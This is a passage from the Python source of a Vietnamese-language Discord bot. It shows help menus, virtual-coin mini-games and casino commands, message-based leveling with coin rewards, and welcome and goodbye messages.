                    "🏰 `nuked serverinfo` – Xem thông tin server.\n"
                    "👥 `nuked membercount` – Xem số thành viên.\n"
                    "🎒 `nuked inventory` – Xem túi đồ của bạn.\n"
                    "🛒 `nuked shop` – Mở cửa hàng mua vật phẩm.\n"
                    "💳 `nuked buyitem <tên>` – Mua nhanh vật phẩm.\n"
                    "📨 `nuked guithu @user <nội dung>` – Gửi tin nhắn riêng.\n\n"
                    "💡 **GỢI Ý:** Hãy dùng `help` và `games` để khám phá tất cả tính năng."
                ),
                color=0x3498DB
            ),
            "guide_tips": discord.Embed(
                title="🎯 MẸO HAY KHI CHƠI",
                description=(
                    "**💰 1. Tích lũy coin:**\n"
                    "   • 📅 Nhận `daily` mỗi ngày trước khi chơi game.\n"
                    "   • ⏰ Làm `work` mỗi giờ để có thu nhập đều.\n"
                    "   • 🚨 Tham gia `crime` khi đã có vốn (rủi ro nhưng lợi nhuận cao).\n\n"
                    "**🎯 2. Chơi game thông minh:**\n"
                    "   • 💡 Bắt đầu với cược nhỏ để làm quen luật.\n"
                    "   • 🪙 `coinflip` và ✂️ `rps` có tỷ lệ 50/50 – an toàn nhất.\n"
                    "   • 🎰 `slots` và 🎫 `lottery` may rủi cao nhưng thưởng lớn.\n"
                    "   • 🚀 `crash` đòi hỏi canh thời điểm – thử với cược thấp trước.\n\n"
                    "**🛒 3. Tận dụng shop:**\n"
                    "   • 🛍️ Mua vật phẩm có lợi thế như tăng may mắn, bảo vệ.\n"
                    "   • 🏷️ Dùng `buyrole` để mua role đặc biệt nếu có đủ coin.\n\n"
                    "**💬 4. Tương tác xã hội:**\n"
                    "   • 💘 Dùng các lệnh tình yêu để tạo không khí vui vẻ.\n"
                    "   • 📨 Gửi thư (`guithu`) để nhắn nhủ bạn bè.\n\n"
                    "**Chúc bạn chơi vui và thắng lớn!** 🎉"
                ),
                color=0xE67E22
            )
        }
        embed = embeds.get(cid, discord.Embed(title="⚠️ Không tìm thấy", color=0xFF0000))
        embed.set_footer(text="Boss Bảo 💖")
        # Thêm GIF tương ứng
        gifs = {
            "guide_economy": "https://media.tenor.com/9Y8pLfX1nK0AAAAM/money.gif",
            "guide_game": "https://media.tenor.com/2k4z1C2d5zIAAAAM/anime-games.gif",
            "guide_love": "https://media.tenor.com/5L1k2C3d4zIAAAAM/anime-love.gif",
            "guide_admin": "https://media.tenor.com/8Y3p5T4a1r2AAAAM/admin.gif",
            "guide_basic": "https://media.tenor.com/7Z5l3Q8w2v0AAAAM/help.gif",
            "guide_tips": "https://media.tenor.com/6Z2o4U5z9s8AAAAM/tips.gif"
        }
        if cid in gifs:
            embed.set_image(url=gifs[cid])
        # Nút quay lại
        back_button = discord.ui.Button(label="🔙 Quay lại", style=discord.ButtonStyle.danger, custom_id="guide_back")
        back_button.callback = self.back_callback
        view = discord.ui.View()
        view.add_item(back_button)
        await interaction.response.edit_message(embed=embed, view=view)

    async def back_callback(self, interaction: discord.Interaction):
        embed = discord.Embed(
            title="📘 HƯỚNG DẪN SỬ DỤNG BOT",
            description=(
                "Chọn một chủ đề bên dưới để xem hướng dẫn chi tiết.\n"
                "Mỗi chủ đề sẽ hiển thị các lệnh và mẹo liên quan."
            ),
            color=0x00FFFF
        )
        embed.set_image(url="https://media.tenor.com/2k4z1C2d5zIAAAAM/anime-hug.gif")
        embed.set_footer(text="Boss Bảo 💖")
        view = GuideView(interaction)
        await interaction.response.edit_message(embed=embed, view=view)

# ==================== CẬP NHẬT GAMEMENUVIEW (TÍCH HỢP GUIDEVIEW) ====================
class GameMenuView(discord.ui.View):
    def __init__(self):
        super().__init__(timeout=None)
        self.add_item(discord.ui.Button(label="💵 Kiếm Coin", style=discord.ButtonStyle.primary, custom_id="coin", row=0))
        self.add_item(discord.ui.Button(label="🎲 Mini Games", style=discord.ButtonStyle.success, custom_id="mini", row=0))
        self.add_item(discord.ui.Button(label="🎰 Sòng Bạc Casino", style=discord.ButtonStyle.danger, custom_id="casino", row=0))
        self.add_item(discord.ui.Button(label="🛒 Cửa Hàng & Vàng", style=discord.ButtonStyle.secondary, custom_id="shop", row=1))
        self.add_item(discord.ui.Button(label="🏆 Bảng Xếp Hạng", style=discord.ButtonStyle.primary, custom_id="lb", row=1))
        # Thêm nút Hướng dẫn dẫn tới GuideView
        self.add_item(discord.ui.Button(label="📘 Hướng Dẫn", style=discord.ButtonStyle.secondary, custom_id="guide", row=2))

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        cid = interaction.data["custom_id"]
        if cid == "guide":
            # Mở GuideView
            embed = discord.Embed(
                title="📘 HƯỚNG DẪN SỬ DỤNG BOT",
                description=(
                    "Chọn một chủ đề bên dưới để xem hướng dẫn chi tiết.\n"
                    "Mỗi chủ đề sẽ hiển thị các lệnh và mẹo liên quan."
                ),
                color=0x00FFFF
            )
            embed.set_image(url="https://media.tenor.com/2k4z1C2d5zIAAAAM/anime-hug.gif")
            embed.set_footer(text="Boss Bảo 💖")
            view = GuideView(interaction)
            await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
            return True
        # Các nút khác giữ nguyên
        if cid == "coin":
            embed = discord.Embed(
                title="💵 DANH MỤC LỆNH KIẾM TIỀN 💵",
                description=(
                    "💰 `nuked balance` — Xem số dư ví & ngân hàng 💳\n"
                    "🎁 `nuked daily` — Nhận quà mỗi ngày (100 - 500 coin) 🌟\n"
                    "💼 `nuked work` — Tăng ca kiếm thêm thu nhập 🛠️\n"
                    "🥺 `nuked beg` — Xin tiền cư dân mạng 🤲\n"
                    "🥷 `nuked crime` — Đi trộm cướp (Cẩn thận đi tù!) 🚨\n"
                    "🏦 `nuked bank deposit <số>` — Gửi tiền gửi tiết kiệm 🔒\n"
                    "💸 `nuked bank withdraw <số>` — Rút tiền mặt ra tiêu 🏧\n"
                    "🤝 `nuked give @user <số>` — Chuyển tiền cho bạn bè 🎁"
                ),
                color=0x00FFCC
            )
        elif cid == "mini":
            embed = discord.Embed(
                title="🎲 DANH MỤC MINI GAMES 🎲",
                description=(
                    "🪙 `nuked coinflip <tiền> <h/t>` — Tung đồng xu 50/50 ✨\n"
                    "🎲 `nuked dice <tiền> <1-6>` — Đoán mặt xúc xắc x4 🎯\n"
                    "✂️ `nuked rps <tiền> <r/p/s>` — Oẳn tù tì ăn tiền 🪨\n"
                    "🎴 `nuked hilo <tiền> <h/l>` — Đoán bài Cao hay Thấp 📈"
                ),
                color=0x2ECC71
            )
        elif cid == "casino":
            embed = discord.Embed(
                title="🎰 SÒNG BẠC CASINO THỜI THƯỢNG 🎰",
                description=(
                    "🎰 `nuked slots <tiền>` — Máy quay xèng Jackpot x5 💎\n"
                    "🚀 `nuked crash <tiền>` — Tên lửa vũ trụ nhân tiền 💥\n"
                    "🎫 `nuked lottery <tiền>` — Mua vé số đại phát x10 🧧\n"
                    "🃏 `nuked blackjack <tiền>` — Xì dách 21 điểm cực đỉnh ♠️"
                ),
                color=0xE74C3C
            )
        elif cid == "shop":
            embed = discord.Embed(
                title="🛒 CỬA HÀNG & ROLE SHOP 🛒",
                description=(
                    "🛍️ `nuked shop` — Xem danh sách vật phẩm hỗ trợ 📜\n"
                    "💳 `nuked buyitem <tên>` — Mua vật phẩm từ Shop 📦\n"
                    "🎒 `nuked inventory` — Mở túi đồ cá nhân 🎒\n"
                    "🏷️ `nuked buyrole <tên>` — Dùng coin mua Role VIP 👑"
                ),
                color=0xF1C40F
            )
        elif cid == "lb":
            embed = discord.Embed(
                title="🏆 BẢNG XẾP HẠNG 🏆",
                description="📊 `nuked leaderboard` — Top 10 đại gia server 👑",
                color=0x9B59B6
            )
        else:
            return True  # không xử lý

        await interaction.response.send_message(embed=embed, ephemeral=True)
        return True

# ==================== LỆNH GAMES ====================
@bot.command(name="games", aliases=["helpgame"])
async def games_menu(ctx):
    embed = discord.Embed(
        title="🎮 TRUNG TÂM GIẢI TRÍ GAME & CASINO 🎮",
        description=(
            "Chào mừng bạn đến với **Nuked Game Center**! 🎉\n\n"
            "👇 **Nhấn vào các nút bấm dưới đây** để xem toàn bộ danh mục hướng dẫn và lệnh chơi chi tiết nhé!"
        ),
        color=0x00FFFF
    )
    embed.set_image(url="https://media.tenor.com/2k4z1C2d5zIAAAAM/anime-hug.gif")
    embed.set_footer(text="Chúc các bạn chơi game vui vẻ & thắng lớn! 💖")
    view = GameMenuView()
    await ctx.send(embed=embed, view=view)

# ==================== XỬ LÝ MESSAGE ====================
@bot.event
async def on_message(message):
    if message.author.bot:
        return

    guild_id = message.guild.id if message.guild else None
    if guild_id:
        if guild_id not in USER_LEVELS:
            USER_LEVELS[guild_id] = {}
        user_id = message.author.id
        if user_id not in USER_LEVELS[guild_id]:
            USER_LEVELS[guild_id][user_id] = {"exp": 0, "level": 1}
        user_data = USER_LEVELS[guild_id][user_id]
        if user_data["level"] < 670:
            user_data["exp"] += 30
            required_exp_for_next = get_required_exp(user_data["level"])
            while user_data["exp"] >= required_exp_for_next and user_data["level"] < 670:
                user_data["exp"] -= required_exp_for_next
                user_data["level"] += 1
                new_lv = user_data["level"]
                if isinstance(message.author, discord.Member):
                    await check_and_assign_level_roles(message.author, new_lv)

                # ===== THƯỞNG COIN KHI LÊN LEVEL =====
                coin_reward = random.randint(50, 200)
                add_coins(message.author.id, coin_reward)

                level_embed = discord.Embed(
                    title="🎉 **CHÚC MỪNG LÊN LEVEL!** 🎉",
                    description=f"🌟 {message.author.mention} đã xuất sắc thăng cấp lên **Level {new_lv}**! 🚀",
                    color=0xFFD700
                )
                level_embed.add_field(name="💰 Thưởng coin", value=f"+{coin_reward} coin", inline=False)
                level_embed.set_image(url="https://i.pinimg.com/originals/c3/2c/e0/c32ce0a583261b5a296afc194671a5f9.gif")
                level_embed.set_footer(text="Hệ thống thăng cấp tự động độc quyền")
                target_channel = message.channel
                if guild_id in SERVER_LEVEL_CHANNELS:
                    set_ch = message.guild.get_channel(SERVER_LEVEL_CHANNELS[guild_id])
                    if set_ch:
                        target_channel = set_ch
                try:
                    await target_channel.send(embed=level_embed)
                except:
                    pass
                required_exp_for_next = get_required_exp(user_data["level"])
                save_levels()

    await bot.process_commands(message)

    # Phản hồi khi gõ "nuked" không hợp lệ
    if message.content.lower().startswith("nuked"):
        content_without_prefix = message.content[len("nuked "):].strip() if len(message.content) > 5 else ""
        if content_without_prefix == "":
            await message.reply("ơi gì vậy sài lệnh thì cứ nuked + lệnh nha")
        else:
            ctx = await bot.get_context(message)
            if ctx.command is None:
                await message.reply("ơi gì vậy sài lệnh thì cứ nuked + lệnh nha")

    # Xử lý tag/chữ "bảo"
    has_owner_mention = False
    if message.mentions:
        for user in message.mentions:
            if user.id in BOT_OWNERS:
                has_owner_mention = True
                break

    if not has_owner_mention:
        content_lower = message.content.lower()
        if "bảo" in content_lower:
            owner_id = BOT_OWNERS[0]
            owner_user = bot.get_user(owner_id)
            if owner_user is None:
                try:
                    owner_user = await bot.fetch_user(owner_id)
                except:
                    owner_user = None
            if owner_user:
                await message.reply(f"{owner_user.mention} ê boss nghe k cs ng gọi kìa")

# ==================== SỰ KIỆN JOIN/LEAVE ====================
@bot.event
async def on_member_join(member):
    if member.guild is None:
        return
    embed_log = discord.Embed(title="👋 THÀNH VIÊN MỚI GIA NHẬP", description=f"{member.mention} đã tham gia server.", color=0x00FF00)
    await send_log_to_all(member.guild.id, embed_log)

    # ===== THƯỞNG COIN KHI JOIN SERVER =====
    coin_reward = random.randint(10, 50)
    add_coins(member.id, coin_reward)

    guild_id = member.guild.id
    if guild_id in WELCOME_CHANNELS:
        ch_id = WELCOME_CHANNELS[guild_id]
        channel = member.guild.get_channel(ch_id)
        if channel:
            embed = discord.Embed(
                title="🌈 **CHÀO MỪNG CHÚ BÁO NHỎ ĐẾN VỚI SERVER!** 🌈",
                description=(
                    f"✨ Chào mừng chú báo nhỏ {member.mention} đã gia nhập máy chủ **{member.guild.name}**!\n\n"
                    f"💰 **Thưởng join:** +{coin_reward} coin (tổng: {get_balance(member.id)} coin)\n\n"
                    "📌 **Giới thiệu các kênh:** Hãy khám phá đầy đủ các khu vực trò chuyện và giải trí.\n"
                    "📜 **Luật chung:** Luôn tuân thủ nội quy để server ngày càng văn minh nhé!\n\n"
                    "💖 Chúc bạn có những phút giây vui vẻ!"
                ),
                color=0x00FFFF
            )
            embed.set_image(url="https://i.pinimg.com/originals/54/19/c9/5419c9ce3ffade43b2837daa2c96b1d9.gif")
            embed.set_footer(text=f"Thành viên thứ #{member.guild.member_count}")
            await channel.send(embed=embed)

@bot.event
async def on_member_remove(member):
    if member.guild is None:
        return
    embed_log = discord.Embed(title="👋 THÀNH VIÊN RỜI KHỎI SERVER", description=f"{member.mention} đã rời server.", color=0xFF9900)
    await send_log_to_all(member.guild.id, embed_log)
    guild_id = member.guild.id
    try:
        dm_embed = discord.Embed(
            title="💔 **TẠM BIỆT BẠN NHÉ!** 💔",
            description=(
                f"😢 Server vô cùng nuối tiếc khi thấy {member.mention} đã rời khỏi **{member.guild.name}**...\n"
                "🍀 Chúc bạn luôn bình an, gặp nhiều may mắn và có một cuộc sống thật vui vẻ, hạnh phúc trên con đường sắp tới! Hẹn gặp lại!"
            ),
            color=0xFF69B4
        )
        dm_embed.set_image(url="https://i.pinimg.com/originals/16/d5/83/16d583a3fd6d356e5a1d5e57b318474c.gif")
        await member.send(embed=dm_embed)
    except:
        pass
    if guild_id in GOODBYE_CHANNELS:
        ch_id = GOODBYE_CHANNELS[guild_id]
        channel = member.guild.get_channel(ch_id)
        if channel:
            embed = discord.Embed(
                title="😢 **TẠM BIỆT THÀNH VIÊN** 😢",
                description=f"Thật sự rất nuối tiếc... Tạm biệt {member.mention}, chúc bạn luôn vui vẻ và có nhiều sức khỏe trên con đường mới!",
                color=0xFF0000
            )
            embed.set_image(url="https://i.pinimg.com/originals/16/d5/83/16d583a3fd6d356e5a1d5e57b318474c.gif")
            await channel.send(embed=embed)

# ==================== ON_READY ====================
@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    print("✨ Bot đã sẵn sàng phục vụ Boss Bảo!")

if __name__ == "__main__":
    if DISCORD_TOKEN is None:
        print("❌ Thiếu TOKEN. Hãy đặt biến môi trường TOKEN.")
        sys.exit(1)
    keep_alive()
    bot.run(DISCORD_TOKEN)
